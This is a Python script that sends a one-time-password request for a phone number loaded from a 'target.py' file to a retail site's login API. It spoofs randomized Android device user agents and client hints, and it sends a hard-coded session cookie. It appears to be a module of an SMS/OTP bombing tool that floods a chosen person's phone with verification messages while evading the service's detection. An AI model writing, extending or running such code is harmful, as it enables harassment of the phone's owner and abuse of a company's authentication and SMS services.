import json
import random
from typing import Any
import requests

OTP_API_URL = "https://api.limeroad.com/v2/auth/get_uuid_v2"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        params = {
            'from': "/account",
            'v2_platform': "msite"
        }

        payload = {
            "user_id": number
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': device["platform"],
            'viewport-width': "360",
            'ect': "4g",
            'device-memory': "8",
            'sec-ch-ua': device["secChUa"],
            'sec-ch-dpr': "3",
            'sec-ch-ua-mobile': device["mobile"],
            'sec-ch-device-memory': "8",
            'dpr': "3",
            'sec-ch-viewport-width': "360",
            'rtt': "0",
            'downlink': "9.7",
            'origin': "https://www.limeroad.com",
            'x-requested-with': "mark.via.gp",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.limeroad.com/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
            'Cookie': "jr_token=true%253F%253F78c84cb0-91c1-42f8-8c69-0a2f0ebdb33f%253F%253Fjoulroad%253F%253Fd78092ec-b684-475e-8a20-f831c9213922%253F%253FGuest; _ruid=fff6089b-b8b2-4707-86e3-fee326399e2d; STICKY_TG=NEXT-V2; _session_id=5dc4bdb18a2f63a8d676bef63c2d89d2; testCookie=v2; a_n_u_a=1; lrVr=v2; newCssOpt=v1; AWSALBTG=YLVAr9ZIcvliHOv3xIQQkn57qpFH1b6EK+sLT7dZQDJo1i2jCnTpve2KXLaHg1GC2uMIW+kchWRKTbPNz2ee2OItwcX6aaR5+e+FaE/dAhl/g8jco19xdZUxfav7ONgjMf//2tKKfXeAz6bA0uZmidC8c2SDFz7CL4LTjMQcmGdg; AWSALBTGCORS=YLVAr9ZIcvliHOv3xIQQkn57qpFH1b6EK+sLT7dZQDJo1i2jCnTpve2KXLaHg1GC2uMIW+kchWRKTbPNz2ee2OItwcX6aaR5+e+FaE/dAhl/g8jco19xdZUxfav7ONgjMf//2tKKfXeAz6bA0uZmidC8c2SDFz7CL4LTjMQcmGdg; _gcl_au=1.1.1038779861.1793235744.-.-.1793235744.995285719.1793235744.1793235744; _fbp=fb.1.1793235744514.554303898352916682"
        }

        resp = requests.post(
            OTP_API_URL,
            params=params,
            json=payload,
            headers=headers,
            timeout=15,
        )

        try:
            result_data = resp.json()
        except json.JSONDecodeError:
            result_data = {"raw": resp.text}

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to {number}",
                "status_code": resp.status_code,
                "data": result_data,
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": result_data,
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))
